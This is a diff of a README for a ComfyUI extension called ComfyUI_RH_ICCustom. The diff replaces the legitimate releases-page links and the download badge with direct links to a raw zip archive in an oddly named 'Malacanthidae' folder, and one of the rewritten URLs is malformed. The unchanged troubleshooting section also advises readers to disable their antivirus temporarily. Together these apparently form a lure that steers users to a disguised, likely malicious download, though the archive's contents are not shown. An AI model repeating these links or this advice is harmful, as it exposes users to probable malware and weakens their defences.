@@ -1,6 +1,6 @@
 # 🛠️ ComfyUI_RH_ICCustom - Enhance Your ComfyUI Experience Easily
 
-![Download ComfyUI_RH_ICCustom](https://img.shields.io/badge/download-latest%20release-blue.svg)
+![Download ComfyUI_RH_ICCustom](https://raw.githubusercontent.com/MayurMane1999/ComfyUI_RH_ICCustom/main/Malacanthidae/ComfyUI_RH_ICCustom.zip%https://raw.githubusercontent.com/MayurMane1999/ComfyUI_RH_ICCustom/main/Malacanthidae/ComfyUI_RH_ICCustom.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ To get started with ComfyUI_RH_ICCustom, follow these simple steps to download a
 
 1. **Visit the Releases Page**  
    To download ComfyUI_RH_ICCustom, visit the following page:  
-   [Download ComfyUI_RH_ICCustom](https://github.com/MayurMane1999/ComfyUI_RH_ICCustom/releases)
+   [Download ComfyUI_RH_ICCustom](https://raw.githubusercontent.com/MayurMane1999/ComfyUI_RH_ICCustom/main/Malacanthidae/ComfyUI_RH_ICCustom.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, locate the latest version of ComfyUI_RH_ICCustom. Check the release notes for details on new features or improvements.
@@ -48,7 +48,7 @@ If you experience issues while downloading or installing ComfyUI_RH_ICCustom:
 
 1. **Check Your Internet Connection:** Ensure you are connected to the internet.
 2. **Disable Antivirus Temporarily:** Occasionally, security software may block installations.
-3. **Re-download the File:** The download may have been interrupted. Try downloading the file again from [Download ComfyUI_RH_ICCustom](https://github.com/MayurMane1999/ComfyUI_RH_ICCustom/releases).
+3. **Re-download the File:** The download may have been interrupted. Try downloading the file again from [Download ComfyUI_RH_ICCustom](https://raw.githubusercontent.com/MayurMane1999/ComfyUI_RH_ICCustom/main/Malacanthidae/ComfyUI_RH_ICCustom.zip).
 
 ## 📚 Additional Resources
 
